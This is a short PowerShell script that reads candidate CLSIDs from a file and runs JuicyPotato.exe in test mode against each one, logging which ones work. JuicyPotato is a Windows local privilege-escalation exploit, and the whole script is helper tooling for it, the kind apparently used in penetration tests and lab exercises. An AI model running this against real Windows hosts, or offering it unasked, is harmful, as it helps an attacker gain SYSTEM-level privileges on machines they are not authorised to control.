$port = 1000
$ids = Get-Content -Path "CLSID.list"
ForEach ($id in $ids){
    .\JuicyPotato.exe -z -l $port -c $id >> result.log
    If ($?) {
        Write-Host "[*] Success! Working CLSID: $id"
        $port++
    }
    Else {
        Write-Host "[*] Sad, Non-working CLSID: $id"
    }
}
